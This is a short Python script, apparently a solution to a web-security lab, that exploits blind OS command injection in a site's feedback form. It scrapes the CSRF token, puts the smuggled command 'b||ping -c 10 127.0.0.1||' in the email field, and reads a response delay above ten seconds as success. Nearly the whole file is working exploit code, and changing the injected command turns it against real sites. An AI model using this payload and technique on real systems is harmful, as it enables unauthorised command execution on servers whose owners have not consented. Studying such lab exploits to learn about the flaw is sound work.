import sys
import requests
import time
from bs4 import BeautifulSoup

if len(sys.argv) != 2:
    print(f"USAGE: {sys.argv[0]} domain")
    sys.exit(1)

URL = sys.argv[1]

path="feedback"
url = URL+path
response = requests.get(url)

soup = BeautifulSoup(response.content, "html.parser")
csrftoken = soup.find('input', dict(name='csrf'))['value']

print("WAIT for 10 sec")

path="feedback/submit"
urli = URL+path
sess_cookie = response.cookies["session"]
payload='b||ping -c 10 127.0.0.1||'
data = {'csrf':csrftoken,'name':'abc','email':payload,'subject':'ghi','message':'jkl'}
start=time.time()
response = requests.post(url=urli,data=data,headers={"Cookie": "session="+sess_cookie})
end=time.time()
delay = end-start
print("delay = ",delay)
if delay>10:
    print(f"Attack succcessful with Testing Payload : {payload}")
